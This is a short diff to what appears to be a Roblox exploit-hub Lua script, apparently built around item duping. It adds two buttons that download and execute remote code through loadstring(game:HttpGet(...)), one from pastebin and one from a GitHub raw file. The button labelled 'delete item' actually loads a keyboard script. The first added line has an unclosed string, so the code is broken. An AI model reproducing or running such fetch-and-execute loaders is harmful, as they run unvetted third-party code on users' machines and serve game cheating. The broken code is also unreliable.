@@ -820,3 +820,11 @@ end)
 Section_yep:NewButton("Copy Youtube", "ButtonInfo",function()
    setclipboard("https://m.youtube.com/@popittradingduping886/videos")
 end)
+
+Section_yep:NewButton("keyboard", "ButtonInfo",function()
+   loadstring(game:HttpGet('https://pastebin.com/raw/nxA7A7W4))()
+end)
+
+Section_yep:NewButton("delete item", "ButtonInfo",function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
+end)
